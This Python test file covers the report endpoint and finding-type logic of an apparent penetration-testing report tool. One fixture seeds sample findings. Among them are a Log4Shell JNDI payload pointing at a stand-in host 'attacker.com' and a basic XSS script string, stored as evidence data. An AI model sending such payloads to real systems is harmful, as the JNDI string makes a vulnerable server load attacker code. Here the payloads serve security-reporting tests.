"""
Unit tests for the Reporting Engine and GET /api/projects/{project_id}/report route.

Test structure
--------------
TestReportEndpoints       — FastAPI route-level tests (HTML + PDF response)
TestReportGeneratorLogic  — ReportGenerator unit tests (context, HTML, PDF)
TestFindingTypeDerivation — _derive_finding_type helper tests
"""

from __future__ import annotations

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

from api.db.models import Base, FindingModel, Project, Target
from api.db.session import get_db
from api.main import app
from api.reporting.generator import ReportGenerator, _derive_finding_type, _get_pdf_backend

TEST_DB_URL = "sqlite:///:memory:"

_test_engine = create_engine(
    TEST_DB_URL,
    connect_args={"check_same_thread": False},
    poolclass=StaticPool,
)
_TestSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=_test_engine)


def _override_get_db():
    db = _TestSessionLocal()
    try:
        yield db
    finally:
        db.close()


@pytest.fixture(autouse=True)
def _setup_db():
    """Create all tables before each test and drop them after."""
    Base.metadata.create_all(bind=_test_engine)
    app.dependency_overrides[get_db] = _override_get_db
    yield
    app.dependency_overrides.pop(get_db, None)
    Base.metadata.drop_all(bind=_test_engine)


@pytest.fixture()
def client():
    return TestClient(app)


@pytest.fixture()
def db_session():
    db = _TestSessionLocal()
    try:
        yield db
    finally:
        db.close()


@pytest.fixture()
def seeded_project(db_session):
    """
    Seed a project with two targets and a realistic mix of findings:
    - t1 (web-front):  Critical (offensive + CVE), High (offensive + CVE), Info (recon)
    - t2 (db-backend): Medium (defensive, no CVE), Low (defensive, no CVE)
    """
    project = Project(
        name="Pentest Engagement Alpha",
        description="Comprehensive external and internal penetration test.",
    )
    db_session.add(project)
    db_session.commit()
    db_session.refresh(project)

    t1 = Target(project_id=project.id, name="web-front",   ip_address="192.168.1.10", status="active")
    t2 = Target(project_id=project.id, name="db-backend",  ip_address="192.168.1.20", status="idle")
    db_session.add_all([t1, t2])
    db_session.commit()
    db_session.refresh(t1)
    db_session.refresh(t2)

    findings = [
        # Offensive — Critical with CVE + CPE + evidence
        FindingModel(
            target_id=t1.id,
            title="Log4Shell RCE",
            severity="Critical",
            cve="CVE-2021-44228",
            cpe="cpe:2.3:a:apache:log4j:2.14.1:*:*:*:*:*:*:*",
            description="Remote code execution in logging framework.",
            remediation="Upgrade to 2.17.1",
            evidence={
                "finding_type": "offensive",
                "param": "X-Api-Version",
                "payload": "${jndi:ldap://attacker.com/a}",
                "callback": True,
            },
        ),
        # Offensive — High with CVE, evidence
        FindingModel(
            target_id=t1.id,
            title="Reflected XSS",
            severity="High",
            cve="CVE-2023-28432",
            description="Unfiltered query reflection.",
            evidence={
                "finding_type": "offensive",
                "parameter": "q",
                "injected": "<script>alert(1)</script>",
            },
        ),
        # Recon — Info, explicit type in evidence
        FindingModel(
            target_id=t1.id,
            title="Server Banner Disclosure",
            severity="Info",
            description="HTTP Server header reveals Apache/2.4.41.",
            evidence={
                "finding_type": "recon",
                "server_header": "Apache/2.4.41 (Ubuntu)",
            },
        ),
        # Defensive — Medium, no CVE
        FindingModel(
            target_id=t2.id,
            title="Unencrypted DB Traffic",
            severity="Medium",
            description="Plaintext DB socket, no SSL.",
            evidence={
                "finding_type": "defensive",
                "ssl_required": False,
            },
        ),
        # Defensive — Low, no CVE, no evidence type (inferred)
        FindingModel(
            target_id=t2.id,
            title="Backup Files World-Readable",
            severity="Low",
            description="Backup files are world-readable.",
        ),
    ]
    db_session.add_all(findings)
    db_session.commit()
    return project


# ===========================================================================
# Route-level tests
# ===========================================================================


class TestReportEndpoints:
    def test_get_report_html_200(self, client, seeded_project):
        response = client.get(f"/api/projects/{seeded_project.id}/report?format=html")
        assert response.status_code == 200
        assert "text/html" in response.headers["content-type"]
        assert "SentryPack Vulnerability Assessment Report" in response.text
        assert "Pentest Engagement Alpha" in response.text
        assert "Log4Shell RCE" in response.text
        assert "CVE-2021-44228" in response.text
        assert "web-front" in response.text

    def test_get_report_default_format_is_html(self, client, seeded_project):
        response = client.get(f"/api/projects/{seeded_project.id}/report")
        assert response.status_code == 200
        assert "text/html" in response.headers["content-type"]
        assert "Pentest Engagement Alpha" in response.text

    def test_get_report_pdf_200(self, client, seeded_project):
        response = client.get(f"/api/projects/{seeded_project.id}/report?format=pdf")
        assert response.status_code == 200
        assert response.headers["content-type"] == "application/pdf"
        assert f'filename="sentrypack_report_{seeded_project.id}.pdf"' in response.headers["content-disposition"]
        assert response.content.startswith(b"%PDF")

    def test_get_report_404_nonexistent_project(self, client):
        response = client.get("/api/projects/9999/report")
        assert response.status_code == 404
        data = response.json()
        assert data.get("error") == "not_found"

    def test_get_report_400_invalid_format(self, client, seeded_project):
        response = client.get(f"/api/projects/{seeded_project.id}/report?format=xml")
        assert response.status_code == 400
        data = response.json()
        assert data.get("error") == "invalid_format"


# ===========================================================================
# ReportGenerator unit tests
# ===========================================================================


class TestReportGeneratorLogic:
    # ── Context / HTML content ──────────────────────────────────────────

    def test_html_contains_project_name(self, db_session, seeded_project):
        gen = ReportGenerator()
        html = gen.render_html(seeded_project, db_session)
        assert "Pentest Engagement Alpha" in html

    def test_html_contains_finding_type_badges(self, db_session, seeded_project):
        """Offensive, defensive, and recon type badges must all appear."""
        gen = ReportGenerator()
        html = gen.render_html(seeded_project, db_session)
        assert "OFFENSIVE" in html
        assert "DEFENSIVE" in html
        assert "RECON" in html

    def test_html_contains_type_badge_css_classes(self, db_session, seeded_project):
        """CSS classes for each type badge must be present."""
        gen = ReportGenerator()
        html = gen.render_html(seeded_project, db_session)
        assert "type-offensive" in html
        assert "type-defensive" in html
        assert "type-recon" in html

    def test_html_contains_evidence_section(self, db_session, seeded_project):
        """Evidence block (details/summary) must appear for findings with evidence."""
        gen = ReportGenerator()
        html = gen.render_html(seeded_project, db_session)
        assert "Evidence" in html
        # Evidence key from the Log4Shell finding
        assert "payload" in html or "param" in html

    def test_html_contains_cpe(self, db_session, seeded_project):
        """CPE pill must be rendered for findings that have a CPE string."""
        gen = ReportGenerator()
        html = gen.render_html(seeded_project, db_session)
        assert "cpe:2.3:a:apache:log4j" in html
        assert "cpe-code" in html

    def test_html_contains_all_severity_levels_in_summary(self, db_session, seeded_project):
        """All 5 severity labels must appear in the executive summary section."""
        gen = ReportGenerator()
        html = gen.render_html(seeded_project, db_session)
        for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
            assert sev in html, f"Severity '{sev}' missing from HTML"

    def test_html_severity_counts_correct(self, db_session, seeded_project):
        """_build_context must count findings per severity correctly."""
        gen = ReportGenerator()
        context = gen._build_context(seeded_project, db_session)
        assert context["summary"]["by_severity"]["Critical"] == 1
        assert context["summary"]["by_severity"]["High"] == 1
        assert context["summary"]["by_severity"]["Medium"] == 1
        assert context["summary"]["by_severity"]["Low"] == 1
        assert context["summary"]["by_severity"]["Info"] == 1
        assert context["summary"]["total_findings"] == 5

    def test_html_type_counts_correct(self, db_session, seeded_project):
        """_build_context must count findings per type correctly."""
        gen = ReportGenerator()
        context = gen._build_context(seeded_project, db_session)
        assert context["summary"]["by_type"]["offensive"] == 2
        assert context["summary"]["by_type"]["defensive"] == 2
        assert context["summary"]["by_type"]["recon"] == 1

    def test_html_appendix_present_when_evidence_exists(self, db_session, seeded_project):
        """The Appendix section must be rendered when any finding has evidence."""
        gen = ReportGenerator()
        html = gen.render_html(seeded_project, db_session)
        assert "Appendix" in html
        assert "Full Evidence Detail" in html

    # ── PDF output ──────────────────────────────────────────────────────

    def test_pdf_starts_with_magic_header(self, db_session, seeded_project):
        gen = ReportGenerator()
        pdf = gen.render_pdf(seeded_project, db_session)
        assert pdf.startswith(b"%PDF"), "PDF must start with %%PDF magic header"

    def test_pdf_minimum_size(self, db_session, seeded_project):
        gen = ReportGenerator()
        pdf = gen.render_pdf(seeded_project, db_session)
        assert len(pdf) > 5000, f"PDF suspiciously small: {len(pdf)} bytes"

    # ── Edge cases ──────────────────────────────────────────────────────

    def test_empty_findings_report(self, db_session):
        """Report for a project with targets but no findings must render cleanly."""
        project = Project(name="Clean Project", description="Zero findings project")
        db_session.add(project)
        db_session.commit()
        db_session.refresh(project)

        target = Target(project_id=project.id, name="clean-host", ip_address="10.0.0.99")
        db_session.add(target)
        db_session.commit()

        gen = ReportGenerator()
        html = gen.render_html(project, db_session)
        assert "Clean Project" in html
        assert "No findings recorded for this target." in html

        pdf = gen.render_pdf(project, db_session)
        assert pdf.startswith(b"%PDF")
        assert len(pdf) > 1000

    def test_render_resilience_on_broken_db(self, db_session):
        """Generator must never raise even when given a non-persisted project."""
        gen = ReportGenerator()
        broken_project = Project(id=-1, name="Broken")
        html = gen.render_html(broken_project, db_session)
        # Should contain project name (from context or error fallback)
        assert "Broken" in html

        pdf = gen.render_pdf(broken_project, db_session)
        assert pdf.startswith(b"%PDF")

    def test_pdf_backend_fallback(self, db_session, seeded_project, monkeypatch):
        """
        When WeasyPrint is unavailable, render_pdf must fall back to ReportLab
        and still produce a valid PDF.
        """
        # Simulate WeasyPrint being absent by forcing backend to 'reportlab'
        import api.reporting.generator as gen_module
        monkeypatch.setattr(gen_module, "_PDF_BACKEND", "reportlab")

        gen = ReportGenerator()
        pdf = gen.render_pdf(seeded_project, db_session)
        assert pdf.startswith(b"%PDF"), "Fallback ReportLab must produce valid PDF"
        assert len(pdf) > 2000


# ===========================================================================
# _derive_finding_type helper tests
# ===========================================================================


class TestFindingTypeDerivation:
    def _make_finding(self, severity="Medium", cve=None) -> FindingModel:
        return FindingModel(title="Test", severity=severity, cve=cve)

    def test_explicit_offensive_from_evidence(self):
        f = self._make_finding()
        assert _derive_finding_type(f, {"finding_type": "offensive"}) == "offensive"

    def test_explicit_defensive_from_evidence(self):
        f = self._make_finding()
        assert _derive_finding_type(f, {"finding_type": "defensive"}) == "defensive"

    def test_explicit_recon_from_evidence(self):
        f = self._make_finding()
        assert _derive_finding_type(f, {"finding_type": "recon"}) == "recon"

    def test_info_severity_infers_recon(self):
        f = self._make_finding(severity="Info")
        assert _derive_finding_type(f, {}) == "recon"

    def test_cve_present_infers_offensive(self):
        f = self._make_finding(cve="CVE-2021-44228")
        assert _derive_finding_type(f, {}) == "offensive"

    def test_no_cve_no_explicit_infers_defensive(self):
        f = self._make_finding(severity="High", cve=None)
        assert _derive_finding_type(f, {}) == "defensive"

    def test_explicit_type_takes_priority_over_severity(self):
        # Info severity would normally → recon, but explicit "offensive" wins
        f = self._make_finding(severity="Info")
        assert _derive_finding_type(f, {"finding_type": "offensive"}) == "offensive"

    def test_explicit_type_takes_priority_over_cve(self):
        # CVE present would normally → offensive, but explicit "defensive" wins
        f = self._make_finding(cve="CVE-2021-44228")
        assert _derive_finding_type(f, {"finding_type": "defensive"}) == "defensive"
